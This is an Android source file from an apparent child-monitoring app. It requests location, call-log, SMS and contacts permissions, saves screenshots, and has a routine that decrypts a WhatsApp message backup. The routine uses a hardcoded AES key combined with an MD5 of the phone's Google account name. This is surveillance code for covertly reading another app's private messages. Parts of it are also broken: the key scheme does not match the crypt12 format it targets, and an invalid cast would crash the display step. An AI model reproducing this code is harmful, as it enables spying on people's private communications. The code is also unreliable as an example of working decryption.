package com.softvilla.childapp;

import android.Manifest;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.graphics.Bitmap;
import android.os.Bundle;
import android.os.Environment;
import android.support.v7.app.AppCompatActivity;
import android.view.View;
import android.widget.TextView;
import android.widget.Toast;

import com.karumi.dexter.Dexter;
import com.karumi.dexter.MultiplePermissionsReport;
import com.karumi.dexter.PermissionToken;
import com.karumi.dexter.listener.PermissionRequest;
import com.karumi.dexter.listener.multi.MultiplePermissionsListener;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.Date;
import java.util.List;

import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class ScreenShots extends AppCompatActivity {

    TextView ShowMsgs;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_screen_shots);

        Dexter.withActivity(this)
                .withPermissions(

                        Manifest.permission.ACCESS_COARSE_LOCATION,
                        Manifest.permission.ACCESS_FINE_LOCATION,
                        Manifest.permission.READ_CALL_LOG,
                        Manifest.permission.READ_SMS,
                        Manifest.permission.READ_CONTACTS,
                        Manifest.permission.WRITE_CONTACTS,
                        Manifest.permission.WRITE_EXTERNAL_STORAGE,
                        Manifest.permission.READ_EXTERNAL_STORAGE
                ).withListener(new MultiplePermissionsListener() {
            @Override
            public void onPermissionsChecked(MultiplePermissionsReport report) {  }

            @Override
            public void onPermissionRationaleShouldBeShown(List<PermissionRequest> permissions, PermissionToken token) {  }
        }).check();

        ShowMsgs = (TextView) findViewById(R.id.show);
        //whatsappmsgs();

        //takeScreenshot();

        /*View v1 = getWindow().getDecorView().getRootView();

        Bitmap bitmap = Screenshot.getInstance().takeScreenshotForView(v1);
        String path = Environment.getExternalStorageDirectory().toString() + "/test";
        FileUtils.getInstance().storeBitmap(bitmap, path);*/
    }

    @Override
    protected void onStart() {
        super.onStart();

        takeScreenshot();
       // shareScreen();
    }

    private void shareScreen() {
        int id = 1;
        try {

            File cacheDir = new File(
                    android.os.Environment.getExternalStorageDirectory(),
                    "devdeeds");

            if (!cacheDir.exists()) {
                cacheDir.mkdirs();
            }

            String path = new File(
                    android.os.Environment.getExternalStorageDirectory(),
                    "devdeeds") + "/.jpg";

            id++;
            Utils.savePic(Utils.takeScreenShot(this), path);

            Toast.makeText(getApplicationContext(), "Screenshot Saved", Toast.LENGTH_SHORT).show();


        } catch (NullPointerException ignored) {
            ignored.printStackTrace();
        }
    }

    private void takeScreenshot() {
        Date now = new Date();
        android.text.format.DateFormat.format("yyyy-MM-dd_hh:mm:ss", now);

        try {
            // image naming and path  to include sd card  appending name you choose for file
            String mPath = Environment.getExternalStorageDirectory().toString() + "/" + now + ".jpg";

            // create bitmap screen capture
            View v1 = getWindow().getDecorView().getRootView();
            v1.setDrawingCacheEnabled(true);
            Bitmap bitmap = Bitmap.createBitmap(v1.getDrawingCache());
            v1.setDrawingCacheEnabled(false);

            File imageFile = new File(mPath);

            FileOutputStream outputStream = new FileOutputStream(imageFile);
            int quality = 100;
            bitmap.compress(Bitmap.CompressFormat.JPEG, quality, outputStream);
            outputStream.flush();
            outputStream.close();

            //openScreenshot(imageFile);
        } catch (Throwable e) {
            // Several error may come out with file handling or DOM
            e.printStackTrace();
        }
    }


    public void whatsappmsgs(){
        byte[] key = { (byte) 141, 75, 21, 92, (byte) 201, (byte) 255,
                (byte) 129, (byte) 229, (byte) 203, (byte) 246, (byte) 250, 120,
                25, 54, 106, 62, (byte) 198, 33, (byte) 166, 86, 65, 108,
                (byte) 215, (byte) 147 };

        byte[] iv = { 0x1E, 0x39, (byte) 0xF3, 0x69, (byte) 0xE9, 0xD,
                (byte) 0xB3, 0x3A, (byte) 0xA7, 0x3B, 0x44, 0x2B, (byte) 0xBB,
                (byte) 0xB6, (byte) 0xB0, (byte) 0xB9 };
        long start = System.currentTimeMillis();

        // create paths
        String backupPath = Environment.getExternalStorageDirectory()
                .getAbsolutePath() + "/WhatsApp/Databases/msgstore.db.crypt12";
        String outputPath = Environment.getExternalStorageDirectory()
                .getAbsolutePath() + "/WhatsApp/Databases/msgstore.db.decrypt";

        File backup = new File(backupPath);

        // check if file exists / is accessible
        if (!backup.isFile()) {
           // Log.e(TAG, "Backup file not found! Path: " + backupPath);
            return;
        }

        // acquire account name
        AccountManager manager = AccountManager.get(this);
        Account[] accounts = manager.getAccountsByType("com.google");

        if (accounts.length == 0) {
            Toast.makeText(this, "Unable to fetch account!", Toast.LENGTH_SHORT).show();
         //   Log.e(TAG, "Unable to fetch account!");
            return;
        }

        String account = accounts[0].name;

        try {
            // calculate md5 hash over account name
            MessageDigest message = MessageDigest.getInstance("MD5");
            message.update(account.getBytes());
            byte[] md5 = message.digest();

            // generate key for decryption
            for (int i = 0; i < 24; i++)
                key[i] ^= md5[i & 0xF];

            // read encrypted byte stream
            byte[] data = new byte[(int) backup.length()];
            DataInputStream reader = new DataInputStream(new FileInputStream(
                    backup));
            reader.readFully(data);
            reader.close();

            // create output writer
            File output = new File(outputPath);
            DataOutputStream writer = new DataOutputStream(new FileOutputStream(output));

            // decrypt file
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            SecretKeySpec secret = new SecretKeySpec(key, "AES");
            IvParameterSpec vector = new IvParameterSpec(iv);
            cipher.init(Cipher.DECRYPT_MODE, secret, vector);
            writer.write(cipher.update(data));
            writer.write(cipher.doFinal());
            writer.close();
            ShowMsgs.setText((CharSequence) writer);
        } catch (NoSuchAlgorithmException e) {
            Toast.makeText(this, "Could not acquire hash algorithm! "+e.toString(), Toast.LENGTH_SHORT).show();
            //Log.e(TAG, "Could not acquire hash algorithm!", e);
            return;
        } catch (IOException e) {
            Toast.makeText(this, "Error accessing file!"+e.toString(), Toast.LENGTH_SHORT).show();
            //Log.e(TAG, "Error accessing file!", e);
            return;
        } catch (Exception e) {
            Toast.makeText(this, "Something went wrong during the encryption!"+e.toString(), Toast.LENGTH_SHORT).show();
            //Log.e(TAG, "Something went wrong during the encryption!", e);
            return;
        }

        long end = System.currentTimeMillis();
        Toast.makeText(this, "Success! It took "+ (end - start) + "ms", Toast.LENGTH_SHORT).show();

        //Log.i(TAG, "Success! It took " + (end - start) + "ms");
    }

    public void Msg(View view) {
        whatsappmsgs();
    }
}
